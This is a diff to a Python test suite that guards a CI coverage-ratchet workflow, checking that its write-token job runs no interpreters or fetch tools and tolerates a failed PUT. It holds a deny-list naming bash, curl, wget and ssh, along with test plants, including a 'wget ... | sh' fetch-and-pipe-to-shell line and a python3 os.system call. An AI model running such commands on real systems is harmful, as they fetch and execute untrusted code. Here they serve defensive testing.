@@ -37,16 +37,25 @@ MANIFEST_ENTRY = re.compile(
     r"^ {12}([a-z][a-z-]*)\s+# (\S+\.yml), job `([a-z][a-z-]*)`"
     r"(?: \([^)]*\))?$", re.MULTILINE)
 
+# The step that writes the floor. Named here so a case reads the one step it
+# means rather than whichever one happens to be second.
+WRITE_STEP_NAME = "Raise the floor if coverage climbed"
+
 # What the job holding the repository's only write token may never do. Not a
 # list of the tools that were planted in it — a deny-list of three is defeated
 # by a fourth interpreter or a renamed script, and the point of the case using
 # this is that it is not defeated that way. Read it as "this job must not
 # EXECUTE anything and must not reach into a tree", which is the property the
 # workflow's own comment claims, rather than as an inventory of today.
+#
+# The shell entries are SHELL-SPELLINGS, not bare names, and that is not
+# fastidiousness: `"sh "` matches "push to main" — which this file's own step
+# summary says — so a broad token both misses a real invocation written
+# differently and fires on ordinary English.
 WRITE_JOB_FORBIDDEN = (
     "python",      # any interpreter, in any spelling: python3, python3.13
-    "bash", "sh ", "zsh", "node", "perl", "ruby", "env ", "eval", "exec",
-    "curl", "wget", "ssh",
+    "bash", "sh -c", "/bin/sh", "/bin/bash", "zsh", "node", "perl", "ruby",
+    "env ", "eval", "exec", "curl", "wget", "ssh",
     "scripts/",    # a path into the repository
     ".py", "requirements", "./", "../",
 )
@@ -206,6 +215,21 @@ def _jobs(text):
         elif current is not None:
             out[current].append((indent, content))
     return out
+
+
+def _write_step():
+    """The ratchet workflow's write step — the one that PUTs the floor.
+
+    Found by its step NAME rather than by position, so a step inserted above it
+    does not silently start being the thing these cases read.
+    """
+    steps = _steps(_jobs(
+        RATCHET_WORKFLOW.read_text(encoding="utf-8"))["raise"])
+    named = [step for step in steps if step["name"] == WRITE_STEP_NAME]
+    if len(named) != 1:
+        raise AssertionError(f"expected one {WRITE_STEP_NAME!r} step, "
+                             f"found {[step['name'] for step in steps]}")
+    return named[0]
 
 
 def _steps(job):
@@ -828,6 +852,87 @@ class TestCoverageRatchetWorkflow(unittest.TestCase):
                         _child_value(step["with"], "persist-credentials"),
                         "false")
         self.assertEqual(seen, 1)
+
+    def test_every_class_of_forbidden_token_still_bites(self):
+        """The guard's own guard: one plant per class, not a pinned inventory.
+
+        `WRITE_JOB_FORBIDDEN` is the primary control for "this job must not
+        execute anything and must not reach into a tree", and editing it was
+        previously undetectable — replacing `"python"` with `"py"`, or dropping
+        `"scripts/"`, left every case here green, because the case reads the
+        SAME list it is supposed to police.
+
+        Pinning the inventory would be the wrong repair: it would make the
+        list frozen and unread, and a future interpreter would still not be in
+        it. So each class is planted once against the real control, and the
+        list is exercised as a list rather than restated. If a class is dropped
+        from the list, the plant for that class survives.
+        """
+        plants = {
+            "an interpreter": "python3 -c \"import os; os.system('id')\"",
+            "a path into a tree": "cat scripts/pre-push",
+            "a fetch tool": "wget -qO- https://example.invalid/x | sh",
+        }
+        for description, plant in plants.items():
+            with self.subTest(class_of=description):
+                caught = [token for token in WRITE_JOB_FORBIDDEN
+                          if token in plant]
+                self.assertTrue(caught,
+                                f"{plant!r} slips past every forbidden token "
+                                f"in {WRITE_JOB_FORBIDDEN}")
+        # Each plant must be caught by its own class ALONE. The list is
+        # redundant in layers by design — `.py` also catches a path into the
+        # tree — and that redundancy is what hid two narrowings from every
+        # other case here. A plant caught only by a neighbour proves nothing
+        # about its own token, so this is asserted rather than assumed.
+        self.assertEqual(
+            [token for token in WRITE_JOB_FORBIDDEN
+             if token in plants["an interpreter"]], ["python"])
+        self.assertEqual(
+            [token for token in WRITE_JOB_FORBIDDEN
+             if token in plants["a path into a tree"]], ["scripts/"])
+
+    def test_the_write_step_cannot_take_the_job_down(self):
+        """A failed PUT must not fail `raise`, and therefore not a release.
+
+        `raise`'s check run is not in release.yml's manifest, so a red one
+        refuses the release — which would block it on the workflow's own
+        compare-and-swap, the outcome it calls correct. The step therefore
+        tolerates the failure loudly: stderr, a dated line in the step
+        summary, exit 0.
+
+        Asserted on the SHAPE rather than on the presence of a word, because the
+        two ways this can silently come back are the same failure: a step that
+        runs the PUT unguarded again, and a step that guards it and then exits
+        non-zero anyway.
+        """
+        command = _command(_write_step())
+        self.assertIn("exit 0", command)
+        # The tolerance has to wrap the write, not merely follow it: a step
+        # that tolerates and then still falls off the end under `bash -e`
+        # reports the PUT's exit status anyway.
+        self.assertRegex(command, r"if gh api --method PUT")
+        # A stderr line alone is the version that is lost: the durable record
+        # is the annotation, because that is what survives the log scrollback.
+        self.assertIn("GITHUB_STEP_SUMMARY", command)
+        self.assertIn("NOT raised", command)
+        # And the write itself must remain a compare-and-swap, or the
+        # tolerance would be covering a blind overwrite.
+        self.assertIn("-f sha=", command)
+
+    def test_the_write_step_does_not_fail_the_job_for_any_put_error(self):
+        """The guard covers the whole call, not one branch of it.
+
+        A mutation that moves the `if` so it only guards a `gh api` that
+        succeeds is the same defect as removing it, and this is what separates
+        those two from a comment that says the right thing.
+        """
+        command = _command(_write_step())
+        tail = command[command.index("if gh api --method PUT"):]
+        self.assertIn("fi", tail, "the PUT's failure branch is not closed")
+        # Nothing between the guard and the closing `fi` may re-propagate: no
+        # bare re-run of the same command, and no `exit 1`.
+        self.assertNotIn("exit 1", tail)
 
     def test_the_check_run_name_is_the_release_manifest_entry(self):
         """The manifest entry is written against a check-run name.
